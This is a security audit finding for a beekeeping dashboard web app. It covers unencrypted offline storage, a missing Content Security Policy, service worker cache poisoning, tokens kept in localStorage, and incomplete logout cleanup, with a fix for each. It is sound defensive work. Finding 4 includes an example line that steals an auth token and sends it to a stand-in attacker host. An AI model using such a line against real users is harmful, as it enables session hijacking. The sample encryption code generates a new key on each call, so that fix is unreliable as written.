# PWA-001: PWA and Offline Storage Security Issues

## Summary

This finding documents security issues related to Progressive Web App (PWA) functionality, Service Worker implementation, and offline data storage in IndexedDB. Offline-first applications have unique security considerations around data persistence, sync operations, and service worker lifecycle management.

---

## Finding 1: Sensitive Data Stored in IndexedDB Without Encryption

**Severity:** MEDIUM
**OWASP Category:** A02:2021 - Cryptographic Failures
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information)

### Affected Files

| File | Line Numbers |
|------|--------------|
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/db.ts` | 1-337 (entire file) |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/offlineInspection.ts` | 86-148 |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/offlineTasks.ts` | (all) |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/offlineCache.ts` | 56-76 |

### Vulnerable Code

**db.ts (lines 55-87) - CachedInspection interface:**
```typescript
export interface CachedInspection {
  id: string;
  tenant_id: string;
  hive_id: string;
  date: string;
  queen_seen: boolean | null;
  eggs_seen: boolean | null;
  // ... detailed hive inspection data
  issues: string | null;
  actions: string | null;
  notes: string | null;  // Could contain sensitive observations
  // ...
}
```

**offlineInspection.ts (lines 86-148):**
```typescript
export async function saveOfflineInspection(
  hiveId: string,
  tenantId: string,
  data: OfflineInspectionInput
): Promise<PendingInspection> {
  // Data stored in plaintext
  const inspection: PendingInspection = {
    // ... all fields stored unencrypted
    notes: data.notes,  // Sensitive user notes
    issues: data.issues.length > 0 ? JSON.stringify(data.issues) : null,
  };
  await db.inspections.put(inspection);
}
```

### Attack Vector

IndexedDB data is stored in the browser's profile directory and accessible to:

1. **Physical access attacks:** Anyone with device access can read IndexedDB files directly
2. **Malware:** Local malware can access browser storage
3. **Shared devices:** Other users on shared devices might access data
4. **Browser extensions:** Malicious extensions can read same-origin IndexedDB
5. **Developer tools:** Anyone with console access can query the database

**Direct browser access:**
```javascript
// In browser console, anyone can query all offline data:
const db = await indexedDB.open('ApisOfflineDB');
// ... enumerate all cached inspections, hives, tasks, etc.
```

### Impact

- **Privacy breach:** Inspection notes may contain sensitive observations
- **Business intelligence leak:** Competitor could learn about hive health patterns
- **Tenant data exposure:** Multi-tenant data could be accessed
- **Location tracking:** GPS coordinates reveal apiary locations

### Remediation

Implement client-side encryption for sensitive fields:

**Option 1: Web Crypto API Encryption**

```typescript
// services/encryption.ts
const ENCRYPTION_KEY_NAME = 'apis-encryption-key';

async function getEncryptionKey(): Promise<CryptoKey> {
  // Key derived from user credentials or stored in secure storage
  const keyMaterial = await window.crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,
    ['encrypt', 'decrypt']
  );
  return keyMaterial;
}

export async function encryptField(data: string): Promise<string> {
  const key = await getEncryptionKey();
  const iv = window.crypto.getRandomValues(new Uint8Array(12));
  const encoded = new TextEncoder().encode(data);

  const ciphertext = await window.crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoded
  );

  // Return IV + ciphertext as base64
  const combined = new Uint8Array(iv.length + ciphertext.byteLength);
  combined.set(iv);
  combined.set(new Uint8Array(ciphertext), iv.length);
  return btoa(String.fromCharCode(...combined));
}

export async function decryptField(encrypted: string): Promise<string> {
  const key = await getEncryptionKey();
  const combined = Uint8Array.from(atob(encrypted), c => c.charCodeAt(0));
  const iv = combined.slice(0, 12);
  const ciphertext = combined.slice(12);

  const decrypted = await window.crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    ciphertext
  );

  return new TextDecoder().decode(decrypted);
}
```

**Option 2: Use Dexie Encrypted addon**

```typescript
import Dexie from 'dexie';
import { encrypt } from 'dexie-encrypted';

const encryptionKey = await deriveKeyFromPassword(userPassword);
encrypt(db, encryptionKey, {
  inspections: 'notes issues actions',
  tasks: 'description completion_data'
});
```

### Acceptance Criteria

- [ ] Encryption implemented for sensitive fields (notes, issues, actions)
- [ ] Encryption key derivation from user credentials
- [ ] Key storage uses browser secure storage (not localStorage)
- [ ] Decryption transparent to application code
- [ ] Data cleared on logout (including encryption keys)
- [ ] Performance impact measured (<100ms per encrypt/decrypt)

---

## Finding 2: Missing Content Security Policy (CSP)

**Severity:** HIGH
**OWASP Category:** A05:2021 - Security Misconfiguration
**CWE:** CWE-1021 (Improper Restriction of Rendered UI Layers)

### Affected Files

| File | Description |
|------|-------------|
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/index.html` | No CSP meta tag |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/vite.config.ts` | No CSP configuration |

### Current State

**index.html** contains no Content-Security-Policy meta tag or headers:
```html
<!DOCTYPE html>
<html lang="en" style="scroll-behavior: smooth;">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>APIS Dashboard</title>
    <!-- No CSP meta tag -->
```

### Attack Vector

Without CSP, the application is vulnerable to:

1. **XSS amplification:** Any XSS can load external scripts
2. **Data exfiltration:** Attackers can send data to any domain
3. **Clickjacking:** Page can be embedded in malicious frames
4. **Mixed content:** HTTP resources could be injected

### Impact

- Increased severity of any XSS vulnerability
- Easier data theft via injected scripts
- Drive-by download attacks
- Cryptomining injection

### Remediation

Add a comprehensive CSP header:

**Option 1: Meta tag (for SPA)**

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https://staticmap.openstreetmap.de https://*.tile.openstreetmap.org;
  connect-src 'self' wss://*.apis.local;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
">
```

**Option 2: HTTP Header (recommended, via server)**

```go
// Server middleware
func CSPMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self'; "+
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; "+
            "font-src 'self' https://fonts.gstatic.com; "+
            "img-src 'self' data: https://staticmap.openstreetmap.de https://*.tile.openstreetmap.org; "+
            "connect-src 'self' wss://*.apis.local; "+
            "frame-ancestors 'none'; "+
            "base-uri 'self'; "+
            "form-action 'self'")
        next.ServeHTTP(w, r)
    })
}
```

**Option 3: Vite plugin for development**

```typescript
// vite.config.ts
import { defineConfig } from 'vite';

export default defineConfig({
  plugins: [
    {
      name: 'csp-headers',
      configureServer(server) {
        server.middlewares.use((req, res, next) => {
          res.setHeader('Content-Security-Policy', "default-src 'self'; ...");
          next();
        });
      },
    },
  ],
});
```

### Acceptance Criteria

- [ ] CSP header configured on server
- [ ] CSP blocks inline script execution
- [ ] CSP limits external resource loading
- [ ] CSP prevents framing (clickjacking protection)
- [ ] CSP violation reporting configured (report-uri)
- [ ] All application features work with CSP enabled
- [ ] PWA service worker registration works with CSP

---

## Finding 3: Service Worker Cache Poisoning Risk

**Severity:** MEDIUM
**OWASP Category:** A08:2021 - Software and Data Integrity Failures
**CWE:** CWE-494 (Download of Code Without Integrity Check)

### Affected Files

| File | Line Numbers |
|------|--------------|
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/vite.config.ts` | 40-93 (workbox config) |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/registerSW.ts` | 86-120 |

### Vulnerable Configuration

**vite.config.ts (lines 46-61):**
```typescript
runtimeCaching: [
  // API responses - stale-while-revalidate for freshness
  {
    urlPattern: /^https?:\/\/.*\/api\/.*/i,
    handler: 'StaleWhileRevalidate',
    options: {
      cacheName: 'api-cache',
      expiration: {
        maxEntries: 100,
        maxAgeSeconds: 60 * 60 * 24, // 24 hours
      },
      cacheableResponse: {
        statuses: [0, 200],  // Status 0 includes opaque responses
      },
    },
  },
```

### Attack Vector

1. **Stale data injection:** Man-in-the-middle could inject malicious API responses that get cached for 24 hours
2. **Opaque response caching:** `statuses: [0, 200]` caches opaque responses which cannot be verified
3. **Long cache lifetime:** 24-hour and 30-day caches allow persistent attacks

**Attack scenario:**
1. Attacker performs MITM during initial load
2. Malicious API response is cached by service worker
3. Even after attack ends, cached malicious response persists for 24 hours
4. User sees manipulated data even on secure network

### Impact

- **Data integrity:** Users see/act on manipulated data
- **Persistent compromise:** Cache persists across sessions
- **Trust erosion:** Users lose confidence in data accuracy

### Remediation

1. **Remove opaque response caching:**
```typescript
cacheableResponse: {
  statuses: [200],  // Only cache successful responses
},
```

2. **Reduce cache lifetime for API responses:**
```typescript
expiration: {
  maxEntries: 100,
  maxAgeSeconds: 60 * 5,  // 5 minutes for API data
},
```

3. **Add cache versioning:**
```typescript
options: {
  cacheName: 'api-cache-v1',  // Bump version to invalidate
  // ...
}
```

4. **Implement cache invalidation on authentication:**
```typescript
// registerSW.ts - Clear API cache on logout
export async function clearApiCache(): Promise<void> {
  const cache = await caches.open('api-cache');
  const keys = await cache.keys();
  await Promise.all(keys.map(key => cache.delete(key)));
}
```

### Acceptance Criteria

- [ ] Opaque response caching removed
- [ ] API cache lifetime reduced to appropriate duration
- [ ] Cache invalidation implemented for logout
- [ ] Cache versioning for deployments
- [ ] Network-first strategy for critical data (authentication status)

---

## Finding 4: Authentication Token in localStorage

**Severity:** MEDIUM
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-522 (Insufficiently Protected Credentials)

### Affected Files

| File | Line Numbers |
|------|--------------|
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/whisperTranscription.ts` | 215-216 |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/config.ts` | 70-77, 90-95, 125-131 |

### Vulnerable Code

**whisperTranscription.ts (lines 215-216):**
```typescript
// Get auth token from localStorage (set by auth provider)
const authToken = localStorage.getItem('apis_auth_token');
```

**config.ts (lines 90-95):**
```typescript
// Cache in sessionStorage for persistence
try {
  sessionStorage.setItem(AUTH_CONFIG_CACHE_KEY, JSON.stringify(config));
} catch {
  // sessionStorage may not be available or full
}
```

### Attack Vector

localStorage is vulnerable to:

1. **XSS attacks:** Any XSS can read all localStorage data
2. **Browser extensions:** Malicious extensions can read localStorage
3. **Shared devices:** localStorage persists until explicitly cleared
4. **No expiration:** Data remains indefinitely

**XSS token theft:**
```javascript
// If attacker achieves XSS:
const token = localStorage.getItem('apis_auth_token');
fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));
```

### Impact

- **Session hijacking:** Stolen tokens allow account takeover
- **Persistent access:** Tokens don't expire until manually cleared
- **Cross-tab attacks:** Malicious tabs can read localStorage

### Remediation

1. **Use httpOnly cookies instead of localStorage for tokens**
2. **For Zitadel OIDC, tokens should remain in memory only:**

```typescript
// Instead of localStorage, use in-memory storage
class SecureTokenStorage {
  private token: string | null = null;

  setToken(token: string): void {
    this.token = token;
  }

  getToken(): string | null {
    return this.token;
  }

  clearToken(): void {
    this.token = null;
  }
}

export const tokenStorage = new SecureTokenStorage();
```

3. **For auth config cache, use sessionStorage with shorter lifetime:**
```typescript
// sessionStorage is slightly better (cleared on tab close)
// But still vulnerable to XSS within the session
```

### Acceptance Criteria

- [ ] Auth tokens removed from localStorage
- [ ] Tokens stored in httpOnly cookies or memory only
- [ ] Session data cleared on logout
- [ ] No sensitive data in localStorage
- [ ] XSS cannot access authentication credentials

---

## Finding 5: Insufficient Data Cleanup on Logout

**Severity:** MEDIUM
**OWASP Category:** A07:2021 - Identification and Authentication Failures
**CWE:** CWE-613 (Insufficient Session Expiration)

### Affected Files

| File | Line Numbers |
|------|--------------|
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/services/offlineCache.ts` | 325-336 |
| `/Users/jermodelaruelle/Projects/apis/apis-dashboard/src/providers/localAuthProvider.ts` | (logout handler) |

### Vulnerable Code

**offlineCache.ts (lines 325-336):**
```typescript
export async function clearAllCache(): Promise<void> {
  await Promise.all([
    db.sites.clear(),
    db.hives.clear(),
    db.inspections.clear(),
    db.detections.clear(),
    db.units.clear(),
    db.metadata.clear(),
  ]);

  console.log('[OfflineCache] All cached data cleared');
}
```

The `clearAllCache` function exists but may not be called on logout.

### Attack Vector

If data isn't cleared on logout:

1. **Next user sees previous data:** On shared devices
2. **Data persists in browser:** Even after logout
3. **Account switching:** Previous tenant's data visible

### Remediation

Ensure comprehensive cleanup on logout:

```typescript
// providers/localAuthProvider.ts - logout handler
logout: async () => {
  try {
    // Call server logout endpoint
    await fetch(`${API_URL}/auth/logout`, {
      method: 'POST',
      credentials: 'include',
    });
  } catch {
    // Continue cleanup even if server call fails
  }

  // Clear all local data
  await Promise.all([
    clearAllCache(),                          // IndexedDB
    clearServiceWorkerCaches(),               // Service worker caches
    clearAuthConfigCache(),                   // Auth config
    localStorage.clear(),                     // Any localStorage data
    sessionStorage.clear(),                   // Session data
  ]);

  return { success: true, redirectTo: '/login' };
},
```

Add service worker cache clearing:
```typescript
// services/cacheCleanup.ts
export async function clearServiceWorkerCaches(): Promise<void> {
  const cacheNames = await caches.keys();
  await Promise.all(
    cacheNames.map(cacheName => caches.delete(cacheName))
  );
}
```

### Acceptance Criteria

- [ ] All IndexedDB tables cleared on logout
- [ ] Service worker caches cleared on logout
- [ ] localStorage cleared on logout
- [ ] sessionStorage cleared on logout
- [ ] Auth tokens/cookies invalidated
- [ ] No data visible after logout and login as different user
- [ ] Automated test verifies complete cleanup

---

## Summary Table

| Finding | Severity | OWASP | Fix Priority |
|---------|----------|-------|--------------|
| Unencrypted IndexedDB data | MEDIUM | A02:2021 | P2 |
| Missing Content Security Policy | HIGH | A05:2021 | P1 |
| Service worker cache poisoning | MEDIUM | A08:2021 | P2 |
| Token in localStorage | MEDIUM | A07:2021 | P1 |
| Insufficient logout cleanup | MEDIUM | A07:2021 | P1 |

## Security Headers Checklist

The following headers should be implemented on the server:

```
Content-Security-Policy: default-src 'self'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(self), microphone=(self), camera=()
X-XSS-Protection: 0  # Deprecated, CSP is preferred
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## References

- [OWASP PWA Security](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/)
- [Service Worker Security](https://developer.chrome.com/docs/workbox/service-worker-overview/)
- [IndexedDB Security Considerations](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API/Using_IndexedDB#security)
- [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API)
